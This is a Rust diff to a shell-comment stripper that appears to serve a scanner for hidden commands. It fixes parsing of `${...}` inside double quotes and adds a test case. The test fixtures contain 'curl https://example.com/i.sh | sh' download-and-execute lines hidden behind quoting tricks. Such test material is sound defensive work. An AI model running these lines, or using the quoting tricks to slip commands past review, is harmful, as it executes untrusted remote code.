@@ -354,10 +354,17 @@ fn strip_shell_comment(line: &str, powershell: bool) -> &str {
             }
             SingleQuote::None => {}
         }
-        // `$(...)` opens a nested subshell/subexpression both inside double quotes and unquoted.
+        // `$(...)` and non-PowerShell `${...}` can nest quotes both inside double quotes and
+        // unquoted.
         if ch == b'$' && b.get(i + 1) == Some(&b'(') {
             frames.push(ShellFrame::CmdSubst { parens: 1 });
             word_start = true;
+            i += 2;
+            continue;
+        }
+        if !powershell && ch == b'$' && b.get(i + 1) == Some(&b'{') {
+            frames.push(ShellFrame::ParamExpand { braces: 1 });
+            word_start = false;
             i += 2;
             continue;
         }
@@ -381,12 +388,6 @@ fn strip_shell_comment(line: &str, powershell: bool) -> &str {
             }
             b'$' if !powershell && b.get(i + 1) == Some(&b'\'') => {
                 single = SingleQuote::AnsiC;
-                word_start = false;
-                i += 2;
-                continue;
-            }
-            b'$' if !powershell && b.get(i + 1) == Some(&b'{') => {
-                frames.push(ShellFrame::ParamExpand { braces: 1 });
                 word_start = false;
                 i += 2;
                 continue;
@@ -909,8 +910,9 @@ mod tests {
                     ")\"\n",
                     "printf '%s\\n' $'it\\'s # text'; curl https://example.com/i.sh | sh\n",
                     "curl https://example.com/${v/ #/-}.sh | sh\n",
+                    "echo \"${v:-\"a # b\"}\"; curl https://example.com/i.sh | sh\n",
                 ),
-                vec![4, 8, 9, 10, 11, 12, 13, 15, 17, 20, 21],
+                vec![4, 8, 9, 10, 11, 12, 13, 15, 17, 20, 21, 22],
             ),
             (
                 "i.ps1",
